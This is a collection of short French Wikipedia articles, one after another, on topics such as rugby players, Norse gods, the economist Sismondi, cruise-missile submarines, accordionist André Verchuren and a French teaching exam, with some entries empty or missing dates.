Olivier Roumat compte 61 sélections dont 58 titularisations en équipe de France entre 1989 et 1996, pour 5 essais marqués, soit 23 points (2 essais à 4 points et 3 essais à 5 points). Il a été 8 fois capitaine entre juin 1993 et juin 1994. Il a pris part à sept éditions du Tournoi des Cinq Nations, de 1990 à 1996, et à deux éditions de la Coupe du monde en 1991 et 1995.

</doc>
<doc id="568479" url="https://fr.wikipedia.org/wiki?curid=568479" title="Rhésus">
Rhésus

Le mot Rhésos (du grec ) ou Rhésus (du latin "Rhesus") désigne originellement une rivière de la Troade et un fleuve côtier du Pont (toutes deux en Anatolie, dans l'actuelle Turquie), le dieu fleuve de cette dernière et un roi mythique de la Thrace.

</doc>
<doc id="568480" url="https://fr.wikipedia.org/wiki?curid=568480" title="Konstantine Lopouchanski">
Konstantine Lopouchanski

Konstantine Sergueïevitch Lopouchanski (en russe : ), né le à Dnipropetrovsk, est un cinéaste russe (ex-soviétique), réalisateur notamment du film "Lettres d'un homme mort", présenté à Cannes en 1987, et de "La Symphonie russe" en 1994.
Biographie.
Konstantin Sergueïevitch Lopouchanski naît en 1947. En 1970, il termine des études de violon au conservatoire de Kazan. De 1973 à 1975, il enseigne la musique, d'abord au conservatoire de Kazan, puis à celui de Léningrad, et il fait parallèlement une thèse d'histoire de l'art. En 1978, il obtient le diplôme des Cours supérieurs de formation des scénaristes et réalisateurs, sous la direction d'Emile Lotianou.
Il a été stagiaire d'Andreï Tarkovski pendant le tournage de "Stalker".
Thèmes de ses films.
Ses films expriment son angoisse de l'apocalypse nucléaire, mais font également entrevoir un nouveau début du monde.

</doc>
<doc id="568482" url="https://fr.wikipedia.org/wiki?curid=568482" title="2006 en Afrique">
2006 en Afrique

Liste d'évènements de l'année 2006 en Afrique, sauf dans les pays ayant leur propre article.
Organisations internationales.
Communauté économique des États de l’Afrique de l’Ouest.
La CEDEAO a demandé au G8 d’étendre l’annulation de la dette à l’ensemble des pays membres de l’organisation. Elle a reconduit à sa tête Mamadou Tandja et a décidé de la transformation du secrétariat en commission avec un président, un vice-président et sept commissaires.
La CEDEAO se félicite de la nomination d’un premier ministre de consensus et la composition d’un gouvernement d’unité nationale en Côte d’Ivoire, ainsi que de la tenue des élections présidentielles au Liberia et en Guinée-Bissau.
Sur le plan économique, les chefs d’État de la CEDEAO souhaitent la création d’une compagnie aérienne régionale pour « surmonter les difficultés de transport aérien » dans la sous-région.
La Cédéao a également adopté une convention qui prévoit « d'interdire le transfert des armes légères au sein de la communauté et entre les États membres, sauf pour les besoins de sécurité légitimes de ces États ou pour leur participation à des opérations de maintien de la paix ».
Union économique et monétaire ouest-africaine (UEMOA).
Les chefs d’État n’ont pu se mettre d’accords sur les remplacements de Charles Konan Banny, nommé premier ministre en Côte d’Ivoire, à la présidence de la Banque centrale des États de l'Afrique de l'ouest (BCEAO) et de Yayi Boni, élu président au Bénin, à la tête de la Banque ouest-africaine de développement (BOAD). Ils ont décidé de prolonger les mandats des présidents intérimaires, le burkinabé Damo Justin Barro à la BCEAO et le malien Issa Coulibaly à la BOAD jusqu’à un projet sommet qui devrait se tenir à Ouagadougou.
Autres organisations.
Le problème de la dette a été au cœur des échanges. Pour Barry Aminata Touré, présidente de la Coalition des alternatives africaines dettes et développement (CAD-Mali), « l'annulation pure et simple de la dette des pays du tiers-monde pour enfin mettre les pays pauvres sur les rails du développement ». L’agriculture et particulièrement les OGM, l’accès à l’eau et l’immigration ont également des sujets débattus par les participants.
Selon Diadié Yacouba Dagnoko, ancien ministre de la Culture et un des coordinateurs du FSM, le forum, qui a accueilli entre quinze et vingt mille participants, aurait coûté 700 millions de francs CFA. S’inscrivant dans le cadre de la du Forum social mondial, le Collectif citoyen pour la restitution et le développement intégré du rail (Cocidirail) a demandé la renationalisation du chemin de fer malien, la réouverture des gares fermées. Il a promis de faire battre Amadou Toumani Touré s’il se présentait à sa réélection en 2007, pour protester contre ses promesses non tenues.
Élections.
La Coalition des forces de changement démocratique (CFCD) a obtenu 41 sièges sur 95 et devancent de peu le regroupement des indépendants, pour la plupart issus de l'ancien parti au pouvoir (trente-neuf députés). L’ancien parti au pouvoir, le Parti républicain pour la démocratie et le renouveau obtient sept députés.
Développement.
Le Burkina Faso, le Mali, La Sierra Leone et le Niger sont les pays ayant le plus faible IDH. Le Porte-parole du gouvernement du Mali, Ousmane Thiam, également ministre de la Promotion des Investissements, des Petites et Moyennes entreprises, a annoncé le le rejet par le gouvernement du rapport estimant que les statistiques sont fausses.

</doc>
<doc id="568485" url="https://fr.wikipedia.org/wiki?curid=568485" title="Rectification (chimie)">
Rectification (chimie)



</doc>
<doc id="568487" url="https://fr.wikipedia.org/wiki?curid=568487" title="EGNOS">
EGNOS



</doc>
<doc id="568488" url="https://fr.wikipedia.org/wiki?curid=568488" title="King Set">
King Set



</doc>
<doc id="568489" url="https://fr.wikipedia.org/wiki?curid=568489" title="Bordage (bateau)">
Bordage (bateau)

Le bordage est une pièce de la charpente d'un navire. Lorsqu'il s'agit d'un navire construit en bois, le bordage est une des pièces dont l'ensemble constitue le bordé. Le bordé est la partie extérieure de la coque que l'on tente de rendre la plus étanche possible. Une suite de bordages mis bout à bout dans le sens de la longueur s'appelle une virure. Le bordage désigne aussi les planches des planchers des ponts, et des planchers intérieurs.
Description.
L'épaisseur et le type des bordages varient selon leur emplacement entre la quille et le haut de la muraille de bordé. Les types de bordage ont été sélectionnés par les charpentiers de marine pour leurs différents avantages et inconvénients, et ce en relation avec les essences de bois utilisées (chêne, orme, sapin d'Europe, teck, etc.).
Exemples de bordages ou de bordés :
Les bordages sont montés sur les couples (membrures) du côté extérieur par clouage ou rivetage autrefois par gournables. Cet assemblage ne donne à la poutre navire qu'une faible résistance au cisaillement (le rectangle peut facilement se déformer en parallélogramme). Cette résistance peut être apportée par assemblage des bordages entre eux (rivetage des clins, chevillage ou tenon et mortaise) ou par le calfatage des "coutures" à franc-bord, travail exécuté par des ouvriers ou des marins appelés calfats.
Le galbord est la virure qui s'emboîte dans la quille par une râblure taillée dans celle-ci. Le ribord est la deuxième virure, en contact avec le galbord. Ces deux virures ont une forme très particulière et une torsion importante. La pose de leurs bordages est une partie particulièrement délicate de la construction.

</doc>
<doc id="568490" url="https://fr.wikipedia.org/wiki?curid=568490" title="Jean de Sismondi">
Jean de Sismondi

Jean Charles Léonard Simonde de Sismondi, né à Genève le et mort à Chêne-Bougeries le , est un historien, essayiste politique et économiste suisse.
Biographie.
D’abord influencé par Adam Smith, il embrasse la cause libérale et fréquente les salons de Madame de Staël au sein du Groupe de Coppet. En 1801, il publie une « statistique du département du Léman » qui expose une situation préoccupante de l'économie genevoise. Attaché aux libertés, il critique vertement le projet de Constitution de la République de Genève soumis à la population en 1816, publie une brochure et fait signer « la pétition des 16 ». À la suite de pressions bourgeoises, il cesse ses critiques.
Son adhésion au libéralisme économique de Ricardo et Smith prend fin en 1819 avec la publication des "Nouveaux principes d'économie politique". Pour la première fois, un économiste évoque une nécessaire redistribution des richesses. Selon lui, loin d'assurer le bien-être de tous, le libéralisme économique accroît la misère des travailleurs parce que :
Il y a donc une contradiction : la mécanisation entraîne du chômage, en remplaçant l'homme par la machine, et permet une production de masse que les travailleurs ne peuvent acheter, ce qui entraîne une surproduction. Ses vues seront critiquées par des auteurs libéraux tant français (Jean-Baptiste Say) qu'anglo-saxons (John Ramsey McCulloch, Robert Torrens et David Ricardo) dans ce qui reste l'une de plus célèbres controverses économiques et l'une des remises en cause les plus virulentes de la loi des débouchés de Say.
Ces "Nouveaux principes" font l'objet d'une seconde édition en 1827, où Sismondi réitère ses critiques envers le libéralisme notamment au regard des crises de surproduction ayant durement affecté l'Angleterre.
Face à cette situation, Sismondi formula un programme d’intervention de l'État ayant pour buts la protection de la classe ouvrière, la lutte contre les excès de la concurrence et la régulation du progrès afin d'éviter le chômage et la crise économique : 
Ses positions furent en partie critiquées par Karl Marx qui le considéra comme le chef du « socialisme petit-bourgeois », et par Lénine qui l'appela « socialiste romantique ». Sismondi ne se considérait pas comme socialiste et avait notamment condamné le système saint-simonien, qui représentait la forme socialiste la plus aboutie à l'époque. Il ne se considérait même pas comme un démocrate. Il a dit : "je suis un libéral, ou encore mieux, un républicain, mais certainement pas un démocrate" en 1835. Il condamnait notamment les effets du vote majoritaire, qu'il considérait comme tyrannique pour la minorité. Sismondi a toujours défendu la propriété privée (il a fortement critiqué Rousseau sur ce point) même s'il considérait qu'elle n'est pas un "droit naturel" mais un droit institué par l'État (dans ses Études d'économie politique). Il a critiqué les effets du libre-échange, notamment en ce qui concerne les destructions d'emplois qu'il entraîne, dans un article portant sur le débat autour des Corn Laws (les lois sur les blés).
Sismondi, d'origine bourgeoise, a toujours eu grand respect des institutions qu'il n'a pourtant jamais hésité à critiquer sévèrement. Il a notamment adhéré à la politique du Progrès graduel du Premier Syndic Jean-Jacques Rigaud, mise en place dès le milieu des années 1820. Convaincu que la Constitution de 1816 devait évoluer, il tint une position délicate, demandant des réformes mais s'opposant à toute révolution violente. Lorsqu'en 1841 une Constituante fut obtenue par pression de la foule, Sismondi s'y opposa. Néanmoins, il décida de s'y porter candidat, fut élu, et milita en son sein pour des réformes minimales, provoquant l'incompréhension des radicaux emmenés par James Fazy. Malade, fatigué, il tint un dernier discours mémorable avant d'être raccompagné chez lui. Il mourut quelques jours plus tard, avant la fin des travaux constituants.
Il se déclarait disciple d'Adam Smith mais s'opposait à la loi de Say (plutôt que de nier la possibilité de la surproduction, il l'explique par trois facteurs : la sous-consommation, la concurrence et l'incertitude de la prévision de débouchés) et prônait l'intervention de l'État. Il n'est ainsi pas considéré comme « classique » mais qualifié de précurseur de Schumpeter pour ses travaux sur le progrès technique, et, suivant les auteurs, de social-démocrate.
Il fut membre du comité philhellène de Genève.
Sismondi a épousé le à Jeffreyston, dans le Pembrokshire (Pays de Galles), Jessica Allen (1777-1853), dont la nièce, Emma Wedgwood, deviendra la femme du naturaliste et paléontologue Charles Darwin. Emma Darwin et Sismondi étaient proches, et ce dernier visita la maison des Darwin lors de son dernier voyage en Angleterre, en 1840 .
Patronyme.
Son véritable nom était Simonde, mais il ajouta Sismondi à son nom patronymique à la suite de prétentions à une origine toscane .
Idées.
Le machinisme.
D'après la thèse de Sismondi, l'introduction de nouvelles machines ne profite qu'au patronat.
En effet, les profits grossissent alors que les salaires restent les mêmes.
Il considère que cette augmentation des capacités de production va mener à des faillites : la consommation ne peut pas suivre le surplus de production puisque les ouvriers ne sont pas payés à leur juste valeur (idée reprise, plus tard, par Karl Marx).↵La concurrence incite les entreprises à investir sans cesse, ce qui cause des faillites en chaîne.
La protection sociale.
Sismondi considère que l'inégal partage des richesses est doublement néfaste : c'est injuste et cela provoque des crises de surproduction.
Il pense alors à faire augmenter les salaires en réduisant le temps de travail et en interdisant le travail des enfants.
Il aimerait aussi que l'entreprise prenne en charge les périodes de maladie et de vieillesse des ouvriers.
Le travail.
Sismondi est le premier à dire que toute la valeur vient du travail, parce qu'il est le seul à ajouter de la valeur à un produit. Il critique la théorie d'Adam Smith qui attribue la valeur d'une marchandise à la quantité de travail qu'elle peut commander et qui fait de la division du travail et de l'extension des marchés la source de la productivité. Pour Sismondi le capital est du travail accumulé. Le travail n'ajoute de la valeur que quand il accumule du capital, c'est-à-dire s'il reste une valeur nette (un surplus, un profit) une fois que toutes les dépenses et en particulier les salaires sont payées. Une production qui se consomme intégralement en salaire n'ajoute aucune valeur, n'est pas productive, il ne fait que reconstituer et perpétuer un cycle, sans en sortir.
Ajouter de la valeur c'est ajouter du capital fixe, des machines, des entrepôts, des forces aveugles de la nature qui ont été redirigés par l'intelligence et l'habileté etc. qui sont autant de richesses futures. Ce capital ne produit que s'il est fécondé par le travail, qui le met en mouvement. Sismondi ajoute que le surplus, le profit sont accaparés par les riches, qui sont propriétaires du capital et de ce fait peuvent décider seuls du partage de la valeur ajoutée, et de la richesse. Ils décident aussi de ce qui est produit, en l'occurrence au ils produisent des biens de luxe qui ne sont d'aucune utilité pour les ouvriers, qui, mis en concurrence par le capital, voient leurs salaires baisser et s'enfoncer dans la misère. Ces thèses seront largement reprises par Marx.
Si la machine est un moyen privilégié de l'accumulation c'est parce qu'elle n'a pas besoin de salaire. Les écologistes, au , viennent objecter qu'une sorte de salaire aurait dû être payé à la nature, pour lui permettre de subsister, tout comme le salaire devait permettre à l'ouvrier de subsister et non de s'enfoncer dans la misère. Le non-entretien de la nature conduit à sa dégradation, il conduit à l'accumulation d'une dette écologique, qui est pour le moment masquée par le déstockage de ressources non-renouvelables.

</doc>
<doc id="568491" url="https://fr.wikipedia.org/wiki?curid=568491" title="Hanjin Shipping">
Hanjin Shipping

Hanjin Shipping et ses filiales Keoyang Shipping, Senator Lines et CyberLogitec constituent les sociétés de transport maritime du groupe coréen Hanjin. Première compagnie de transport maritime coréenne, et une des plus importantes au monde, la société Hanjin Shipping dispose de 150 navires qui desservent 80 ports dans 35 pays.
Histoire.
En , Hanjin se place en redressement judiciaire. À la suite de cela, un tiers de sa flotte connait des difficultés pour décharger, et même s'amarrer, à cause du refus d'accès par différents ports notamment en Chine pour ses bateaux. En , victime d'un endettement de 5 milliards d’euros, le groupe est déclaré en faillite par le tribunal de Séoul.

</doc>
<doc id="568492" url="https://fr.wikipedia.org/wiki?curid=568492" title="Sous-marin nucléaire lanceur de missiles de croisière">
Sous-marin nucléaire lanceur de missiles de croisière

Les sous-marins nucléaires lanceurs de missiles de croisière sont désignés selon le code OTAN par le sigle "SSGN" pour "Ship Submersible Guided missile Nuclear".
Missions.
La terminologie française ne les distingue pas des sous-marins nucléaires d'attaque (SNA), d'autant que tous les SNA (comme de nombreux sous-marins classiques), sont potentiellement lanceurs de missiles aérodynamiques à changement de milieu (lancement en plongée).
Du reste leurs missions sont, comme pour les SNA, la protection de forces navales, la lutte anti-navires et la projection de puissance (action contre la terre).
Histoire.
La marine soviétique a inauguré cette nouvelle classe de navires en mettant en service à la fin des années 1950 des sous-marins capables de lancer des salves de missiles anti-navires devant saturer les défenses antiaériennes des task forces de l'OTAN, en particulier les groupes aéronavals en cas de conflit.
Aux États-Unis, quatre sous-marins à propulsion classique furent équipés de missiles de croisière SSM-N-8 Regulus à tête nucléaire destinés à la dissuasion avant la mise en service des SNLE équipé des missiles balistiques Polaris entre 1955 et 1964. Le premier bateau classifié comme SSGN selon le code des immatriculations des navires de l'US Navy fut le entré en service en 1960.
La marine chinoise testa à partir de 1985 un sous-marin Type-033G de la classe Wuhan armé de six missiles antinavires C-801 similaires aux premiers exemplaires soviétiques.
L'existence actuelle de cette catégorie intermédiaire aux États-Unis est la conséquence de la fin de la guerre froide et des accords START de 1986. En effet, ces accords qui ont plafonné le nombre d'ogives nucléaires ont obligé les États-Unis et l'Union soviétique à procéder au démantèlement d'une partie de leur force de frappe nucléaire.
Débarrassés de leurs charges nucléaires, quatre SNLE de la ont été réemployés partir de 2006 sur des missions de SNA avec une possibilité d’emport d'un maximum de de croisière Tomahawks et de plus de . Ce sont ces sous-marins qui constituent la catégorie des sous-marins nucléaires lanceurs de missiles de croisière.
Dès lors il n'est pas étonnant que seules les forces américaines et russes, parties à l'accord START, détiennent des exemplaires de cette catégorie. Enfin, le caractère "sui generis" de cette dernière la condamne à disparaître avec la mise à la retraite des exemplaires encore en activité. En , on prévoit le retrait du dernier Ohio de cette catégorie en 2027.
Il est prévu a cette date qu'ils seront remplacés par la classe Virginia dont la version dite block V se voit augmentée d'une section de coque de 27 mètres pour recevoir 28 missiles de croisière, en sus des 12 qui sont installés dans la partie avant. Le premier de cette version devant être le autorisé en .
Exemplaires.
La marine soviétique puis russe a disposé des premiers sous-marins de cette catégorie avec notamment la .
Dans les marines de l'OTAN, actuellement, seuls 4 bâtiments de la , des SNLE reconvertis sont dans cette catégorie avec une possibilité de lancement de 105 à un maximum de 154 missiles de croisière.
Les missiles utilisés sont :

</doc>
<doc id="568494" url="https://fr.wikipedia.org/wiki?curid=568494" title="Boxworld">
Boxworld



</doc>
<doc id="568495" url="https://fr.wikipedia.org/wiki?curid=568495" title="Baka (peuple)">
Baka (peuple)



</doc>
<doc id="568497" url="https://fr.wikipedia.org/wiki?curid=568497" title="Vé (dieu)">
Vé (dieu)

Dans la mythologie nordique, Vé ("Véi", "Ingwar", "Hoenir", "Freyr" : « sacré », « sanctuaire », en vieux norrois) et son frère Vili (volonté) sont des dieux, fils de Bor et de la géante Bestla, et frères d’Odin. L'ancienneté de la triade des trois Ases (Odin, Vili et Vé) est attestée par l'allitération des trois noms Wodan (autre nom d'Odin) / Vili / Vé. Ces divinités succédèrent à Tuisto et Jord et sont l'une des premières évolutions dans l'élaboration du panthéon nordique. 
Vili et Vé apparaissent dans trois mythes.
La création du monde.
C'est en tuant le géant Ymir qu'Odin, Vili et Vé sont à l'origine de la création du monde (
Edda de Snorri, "Gylfaginning", 7), faisant de sa chair la terre, de son sang la mer et les lacs, de son crâne le ciel, de ses os les montagnes...
La création de l'homme.
Selon Snorri Sturluson, Odin, Vili et Vé sont aussi à l'origine de la création de l'homme ("Gylfaginning", 8). Ayant trouvé deux troncs d'arbre le long du rivage de la mer, ils les façonnèrent pour former deux êtres humains. Odin leur donna le souffle et la vie, Vili l'intelligence et le mouvement, Vé l'apparence, la parole, l'ouïe et la vue. Ils leur donnèrent aussi des vêtements, et les nommèrent Ask et Embla.
Toutefois, dans la Völuspa (17,18), poème de l"'Edda poétique", c'est une triade de dieux différente qui crée les premiers êtres humains : si Odin en fait toujours partie, Vili et Vé sont remplacés par Hœnir et Lóðurr.
Le bannissement d'Odin.
En dehors de ce mythe des origines, Vili et Vé n'apparaissent ensuite que dans celui connu sous le nom de "bannissement d'Odin", et encore uniquement dans la version racontée par Snorri dans son Ynglingasaga (3). Il y est dit qu'Odin étant parti pour un très long voyage, les Ases crurent qu'il ne reviendrait pas. Vill et Vé se partagèrent alors son héritage, ainsi que sa femme Frigg. 
Il est fait allusion à cet épisode dans la Lokasenna (26), poème de l"'Edda poétique", lorsque Loki reproche à Frigg d'avoir trompé Odin avec les frères de celui-ci.

</doc>
<doc id="568499" url="https://fr.wikipedia.org/wiki?curid=568499" title="André Verchuren">
André Verchuren

André Edmond Verschuere, dit André Verchuren, né le à Neuilly-sous-Clermont, dans l'Oise, et mort le à Chantilly, est un accordéoniste français.
En 1936, à l'âge de , il remporte le concours international d'accordéon de Soignies, en jouant l'ouverture des "Saltimbanques" debout, contre les codes de l'époque. Il est l’accordéoniste ayant vendu le plus de disques, avec plus de d'unités vendues.
Biographie.
André Verchuren est né Belge, issu d'une famille originaire de Knesselare en Belgique ; son grand-père est Petrus Verschuere (1865-1909), accordéoniste et vendeur de bijoux, venu travailler dans les mines. Ce dernier est venu en France avec sa femme et ses enfants dont Raymond Verschuere, père d'André Verchuren. Petrus s'installe ensuite dans le Pas-de-Calais à Pont-à-Vendin. Raymond Verschuere, accordéoniste professionnel (1894-1975), est venu à Neuilly-sous-Clermont pour rendre visite à un oncle, et il fit la connaissance de Marie-Clémence Massez, couturière (1899-1993), originaire d'Ully-Saint-Georges, ancien village rattaché à la commune de Rantigny. Il se fixe alors dans la région et se marie avec cette dernière. Ils donnent naissance à un fils, André.
Le jeune André commence l'accordéon à en suivant les cours de son père, Raymond. Il touche son premier cachet à en animant un bal à Ponchon, accompagné de sa mère, Marie-Clémence, à la batterie. Ensuite, il dispense des cours dans l'école d'accordéon de son père. Il est embauché dans une usine de tréfilage, devient garçon de café et jardinier.
Alors qu'il peut opter pour la nationalité française, le , il décline cette nationalité. Il ne va être naturalisé français que le .
Pendant la Seconde Guerre mondiale, André Verchuren entre dans la Résistance en aidant des aviateurs alliés, abattus au-dessus de sa région, à se cacher. En juin 1944, il est dénoncé, arrêté par la Gestapo, torturé et envoyé au camp de Dachau dans le « Train de la mort », convoi , le . Durant sa période de détention à Dachau, il est notamment affecté au personnel travaillant aux fours crématoires. Le , il provoque les SS en faisant, au péril de sa vie, chanter "La Marseillaise" à tous ses camarades détenus du "Block" dans lequel il se trouve. Le 24 juillet, il est transféré à Neckarelz, camp annexe du KL Natzweiler. C'est un déporté résistant. À la sortie des camps, il lui faut plusieurs années pour que ses doigts retrouvent leur agilité.
Il reçoit le diplôme de reconnaissance des États-Unis envoyé par le président Dwight D. Eisenhower, pour l'aide qu'il a apportée aux aviateurs alliés.
Marié à Mireille Roux en 1946, il en divorce en 1950 puis épouse Micheline Butot en 1953. André Verchuren a deux fils : l’aîné Harry Williams, en hommage à un parachutiste que son père avait aidé pendant la guerre, est devenu producteur de musique ; le plus jeune se nomme André Verchuren Junior. Son épouse Micheline Butot meurt en 1974 sur une route en Normandie près de Vire dans un accident de voiture alors qu'André est au volant. Il est lui-même légèrement blessé, et condamné pour homicide involontaire à trois mois d'emprisonnement avec sursis.
Carrière musicale.
En 1936, à , il remporte le concours international d'accordéon de Soignies, en jouant l'ouverture des "Saltimbanques" debout, contre les codes de l'époque. La coupe est remise des mains du roi Léopold III de Belgique. La même année, il participe au Concours international de l’accordéon organisé par l'Association internationale des accordéonistes qui se dispute à Paris, au Moulin de la Galette où il finit .
Carrière artistique.
À partir de 1950, Verchuren voit sa carrière prendre forme à la suite de sa participation à l'émission populaire de Radio Luxembourg "Swing contre musette" (il a été inscrit à l'émission par son collègue Tony Murena). Il habite en 1951, au 45 rue Boursier à Creil, et cette année-là, il fait une demande à la Sacem pour être inscrit comme compositeur. Il en devient membre définitif le et il change à cette occasion provisoirement son patronyme pour Verschueren puis définitivement pour Verchuren.
Sélectionné pour un match organisé sur la scène du Moulin-Rouge auquel assistent en direct dix millions d'auditeurs, il emporte les suffrages. Grâce à Louis Merlin qui était présent dans la salle, il entre chez Decca, sa première maison de disques, avant d'intégrer la maison Festival. En 1956, il est le premier accordéoniste à se produire à l'Olympia à Paris pendant trois semaines. Le succès populaire est immédiat. Parallèlement à ses émissions à la radio (dix-sept ans sur RTL, puis treize sur Europe 1), « Verchu » va à la rencontre de ses auditeurs. Il sillonne la France entière, donnant, en moyenne, cent cinquante galas par an. Il affirmait : Il a inventé la formule du « bal-music-hall ».
En 1968, André Verchuren publie ses mémoires sous le titre "Mon accordéon et moi".
Il a joué lors du plus grand bal de France devant . Le , il fête ses quatre-vingts ans de carrière lors d'un concert à l'Elispace de Beauvais.
Il a vendu plus de d'albums, enregistré durant sa carrière tous supports confondus (deux par semaine). En 1992, il affirme avoir parcouru de km en voiture, un million en avion. Il a participé à plus de dix mille galas devant de spectateurs.
Il habite rue du Parc-Maillet à Creil pour ensuite vivre une retraite tranquille dans sa demeure de Gouvieux, et meurt le à l'âge de d'un arrêt cardiaque alors qu'il dînait dans la pizzeria "Le Napoli", à Chantilly (Oise).
Ses obsèques ont lieu le mercredi , en l'église Notre-Dame-de-l'Assomption de Chantilly, avant son inhumation avec Micheline, décédée en 1974, et ses parents au cimetière Bourillon de Chantilly.
Prix et distinctions.
André Verchuren a été gratifié des distinctions suivantes : 
André Verchuren a reçu les prix suivants :

</doc>
<doc id="568500" url="https://fr.wikipedia.org/wiki?curid=568500" title="Abélien">
Abélien

L'adjectif abélien, dérivé du nom du mathématicien norvégien Niels Abel, est employé dans de nombreux domaines des mathématiques.
En théorie des groupes,
En analyse,
En théorie des nombres,
En théorie des catégories,

</doc>
<doc id="568501" url="https://fr.wikipedia.org/wiki?curid=568501" title="Olivier Brouzet">
Olivier Brouzet

Olivier Brouzet, né le à Béziers, est un joueur de rugby à XV évoluant au poste de deuxième ligne. Il est sélectionné à 71 reprises en équipe de France.
Biographie.
Olivier Brouzet est le fils de Yves Brouzet, athlète français qui détient le record français de lancer du poids de 1973 à 2007. Il est marié à Valérie Cousset une joueuse de handball internationale espoir qui a évolué en D1 à Mios-Biganos. Leur fils, Hugo, est champion du monde jeunes de handball en 2017 et a signé en 2019 son premier contrat professionnel au Chambéry Savoie Mont Blanc Handball. Olivier Brouzet est aussi l'oncle de Thomas Jolmès.
Olivier Brouzet commence le rugby au RC Seyssins avant de continuer au FC Grenoble. Il fait ses débuts en équipe première en 1990.
Il fait partie de l'équipe des "Mammouths de Grenoble" qui est vice-champion de France 1993, défait 14 à 11 par le Castres olympique sur une erreur d'arbitrage, dans une finale considérée comme l'un des plus gros scandales du rugby français. Il marque également un essai qui sera refusé aux "Mammouths" grenoblois ce soir-là.
Le , il joue son premier match avec les Barbarians français contre les Barbarians au stade Charlety à Paris. Les "Baa-Baas" s'imposent 35 à 18.
Il reste au FC Grenoble jusqu'en 1996 lorsqu'il part jouer au Club athlétique Bordeaux Bègles Gironde où il reste quatre saisons jusqu'en 2000. Puis il passe deux saisons en Angleterre avec les Northampton Saints avant de revenir en France deux saisons avec l'ASM Clermont et une saison avec le Stade français Paris.
En , il est sélectionné une deuxième et dernière fois avec les Barbarians français pour jouer contre l'Australie au stade Jean-Bouin à Paris. Les "Baa-Baas" s'inclinent 15 à 45.
En 2005, il participe avec le Stade français à la finale de Coupe d'Europe face au Stade toulousain au Murrayfield Stadium à Édimbourg. Il commence le match sur le banc puis remplace Mike James à la minute. À l'issue du temps réglementaire, les deux équipes sont à égalité, 12 à 12, mais les toulousains parviennent à s'imposer 12 à 18 à l'issue des prolongations.
Il travaille pour l'Union Bordeaux Bègles en tant que directeur du développement auprès du président Laurent Marti de 2007 au .

</doc>
<doc id="568502" url="https://fr.wikipedia.org/wiki?curid=568502" title="Vili (mythologie)">
Vili (mythologie)

Dans la mythologie nordique, Vili (volonté en vieux-norrois) et son frère Vé sont des dieux, fils de Bor et de la géante Bestla, et frères d'Odin. L'ancienneté de la triade Odin, Vili et Vé est attestée par l'allitération des trois nom Wotan (autre nom d'Odin) / Vili / Vé.
Vili et Vé apparaissent dans trois mythes.
La création du monde.
C'est en tuant le géant Ymir qu'Odin, Vili et Vé sont à l'origine de la création du monde (
"Edda de Snorri", "Gylfaginning", 7), faisant de sa chair la terre, de son sang la mer et les lacs, de son crâne le ciel, de ses os les montagnes...
La création de l'homme.
Selon Snorri Sturluson, Odin, Vili et Vé sont aussi à l'origine de la création de l'homme ("Gylfaginning", 8). Ayant trouvé deux troncs d'arbre le long du rivage de la mer, ils les façonnèrent pour former deux êtres humains. Odin leur donna le souffle et la vie, Vili l'intelligence et le mouvement, Vé l'apparence, la parole, l'ouïe et la vue. Ils leur donnèrent aussi des vêtements, et les nommèrent Ask et Embla.
Toutefois, dans la "Völuspa" (17,18), poème de l"'Edda poétique", c'est une triade de dieux différente qui crée les premiers êtres humains : si Odin en fait toujours partie, Vili et Vé sont remplacés par Hoenir et Lodur.
Le bannissement d'Odin.
En dehors de ce mythe des origines, Vili et Vé n'apparaissent ensuite que dans celui connu sous le nom de "bannissement d'Odin", et encore uniquement dans la version racontée par Snorri dans son "Ynglingasaga" (3). Il y est dit qu'Odin étant parti pour un très long voyage, les Ases crurent qu'il ne reviendrait pas. Vili et Vé se partagèrent alors son héritage, ainsi que sa femme Frigg. 
Il est fait allusion à cet épisode dans la "Lokasenna" (26), poème de l"'Edda poétique", lorsque Loki reproche à Frigg d'avoir trompé Odin avec les frères de celui-ci.

</doc>
<doc id="568504" url="https://fr.wikipedia.org/wiki?curid=568504" title="Agrégation de sciences de la vie - sciences de la Terre et de l'Univers">
Agrégation de sciences de la vie - sciences de la Terre et de l'Univers

En France, l'agrégation de sciences de la vie - sciences de la Terre et de l'Univers (SV-STU) est une des sections du concours de l’agrégation permettant de devenir professeur de sciences de la vie et de la Terre (SVT). Elle a pris successivement les appellations d’agrégation de sciences naturelles (issue de l’agrégation de physique-sciences naturelles, elle-même issue de l’agrégation des sciences), puis d’agrégation de science de la vie et de la Terre avant que son intitulé actuel entre en vigueur lors de la session 2002.
Historique.
En 1841, la scission de l’agrégation des sciences – qui existait depuis 1821 – donne naissance à l’agrégation de mathématiques et à une agrégation de physique-sciences naturelles, qui sera elle-même à nouveau scindée pour donner l’agrégation de sciences naturelles qui est créée en 1881.
À partir de 1959, cette agrégation de sciences naturelles comprend deux options : sciences biologiques et sciences de la Terre. Elle perdure sous ce nom jusqu’à la session de 1994 et prend le nom d’agrégation de sciences de la vie et de la Terre à partir de la session 1995.
L’intitulé « Section Sciences de la Vie et de la Terre » est remplacé par : « Section Sciences de la Vie - Sciences de la Terre et de l'Univers » à partir de la session 2002.
Structure en secteurs.
Jusqu'à une époque récente, cette agrégation comportait trois secteurs : zoologie, botanique et géologie.
Désormais, botanique et zoologie sont fondus en un seul secteur B (biologie des organismes), associé à l'écologie, l'évolution, le secteur A regroupe la biochimie, la biologie moléculaire et cellulaire, la physiologie humaine, le secteur C les sciences de la Terre et de l'Univers.
Le choix d'un secteur induit un coefficient légèrement différent de l'épreuve orale face aux secteurs non choisis.
Selon le choix de secteur du candidat, pour les épreuves d'admission, le candidat passera une épreuve d'option et une de contre-option. L'épreuve de contre-option est au choix parmi les secteurs A et B si l'option est C ; si l'option est A ou B, la contre-option est obligatoirement C.
Les épreuves d'admission sont des travaux pratiques (option : 6 h, coef. 3 ; contre-option : 4 h, coef. 2), et un oral (option : 50 minutes d'exposé et 30 minutes d'entretien, coef. 5 ; contre-option : 1 h 30, coef. 4)
Orientations de l'agrégation.
Il est attendu du candidat de solides connaissances, mais aussi la maîtrise de la démarche expérimentale. Une connaissance de base bien assimilée est généralement mieux valorisée qu'un savoir fait de détails mais mal intégré.

</doc>
<doc id="568505" url="https://fr.wikipedia.org/wiki?curid=568505" title="Sainte-Araille">
Sainte-Araille

 
Sentə-Araljə / Senta-Aralha / Sainte-Araille est le nom gascon pour Sancta Eulalia / Sainte Eulalie, martyre devenue patronne de Barcelone.
Présentation.
L'importante transformation phonétique s'explique par :
La perte de conscience de cette équivalence, a produit des graphies agglutinées ou improprement masculinisées de ce nom de Sainte-Araille :
Le X vient de la palatisation fréquente en gascon du "s" initial en "sh", écrit "x" dans le sud-ouest de l'Europe.

</doc>
